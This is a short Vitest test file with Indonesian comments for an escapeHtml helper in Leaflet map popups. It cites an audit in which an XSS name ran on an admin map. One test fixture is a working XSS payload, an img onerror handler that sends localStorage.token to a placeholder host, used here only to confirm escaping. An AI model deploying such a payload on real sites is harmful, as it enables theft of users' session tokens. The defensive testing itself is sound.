/**
 * escapeHtml — dipakai popup peta (Leaflet merender string sebagai HTML).
 * Audit 2026-11-23: nama TPD berisi <img onerror=…> sempat dieksekusi di peta admin.
 */
import { describe, test, expect } from 'vitest';
import { escapeHtml } from '../escapeHtml';

describe('escapeHtml', () => {
  test('menetralkan tag & atribut', () => {
    const evil = `<img src=x onerror="fetch('//x?'+localStorage.token)">`;
    const out = escapeHtml(evil);
    expect(out).not.toContain('<');
    expect(out).not.toContain('"');
    expect(out).toBe('&lt;img src=x onerror=&quot;fetch(&#39;//x?&#39;+localStorage.token)&quot;&gt;');
  });

  test('angka, null, dan teks biasa aman', () => {
    expect(escapeHtml(12)).toBe('12');
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml('Budi & Sari')).toBe('Budi &amp; Sari');
  });
});
